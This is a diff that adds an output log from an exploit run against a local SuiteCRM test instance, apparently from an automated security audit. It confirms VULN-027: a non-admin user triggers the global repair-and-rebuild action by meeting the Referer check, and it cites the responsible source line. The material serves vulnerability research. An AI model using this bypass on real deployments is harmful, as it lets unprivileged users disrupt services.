@@ -1,0 +1,15 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-027/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-027/../.venv
+========================================================================
+VULN-027: Administration action=repair global rebuild by any user (BFLA/DoS)
+target: http://localhost:33116
+========================================================================
+[INFO] sink: modules/Administration/views/view.repair.php:53 repairAndClearAll(); Administration commented out of $adminOnlyList
+[SETUP] admin creates a disposable low-privilege user (is_admin=0)
+[SETUP] authenticated as low-priv user mod_c00fee73
+[STEP] control: GET repair with NO Referer -> the empty-Referer CSRF guard should block (separate control)
+[PROOF] no-Referer repair: HTTP 200, csrf-guard-blocked=True (expected True)
+[STEP] attack: GET repair WITH a valid same-origin Referer (as any real logged-in user) -> missing is_admin gate
+[PROOF] valid-Referer repair: HTTP 200, len=85836, xsrf=False, denied=False, repair-ran=True
+[OK] exploit confirmed — a non-admin ran the global repairAndClearAll (no is_admin gate); the empty-Referer CSRF guard is the ONLY barrier and is trivially met by any real logged-in user
+==> VULN-027: CONFIRMED — any authenticated user triggers the global Administration repair/rebuild (BFLA -> DoS)
